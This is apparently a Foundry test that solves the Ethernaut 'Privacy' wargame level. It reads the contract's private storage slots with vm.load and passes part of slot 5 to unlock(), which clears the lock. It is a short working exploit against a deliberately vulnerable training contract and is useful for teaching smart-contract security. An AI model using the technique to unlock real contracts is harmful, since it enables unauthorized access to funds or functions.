// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

import "forge-std/Test.sol";
import "forge-std/console.sol";
import "../../src/12_Privacy/Privacy.sol";

contract PrivacyTest is Test {

    Privacy public victim;
    address public owner;
    address public hacker;

    function setUp() public {
        bytes32[3] memory data = [bytes32(0), bytes32("1"), bytes32("2")];
        owner = vm.addr(1);
        hacker = vm.addr(2);

        vm.startPrank(owner);

        victim = new Privacy(data);

        vm.stopPrank();
    }

    function test_HackPrivacy() public {

        bytes32 locked = vm.load(address(victim), bytes32(uint256(0)));
        bytes32 ID = vm.load(address(victim), bytes32(uint256(1)));
        bytes32 data = vm.load(address(victim), bytes32(uint256(5)));

        console.logBytes32(locked);
        console.logBytes32(data);
        console.logBytes32(ID);

        victim.unlock(bytes16(data));

        assert(victim.locked() == false);


    }

}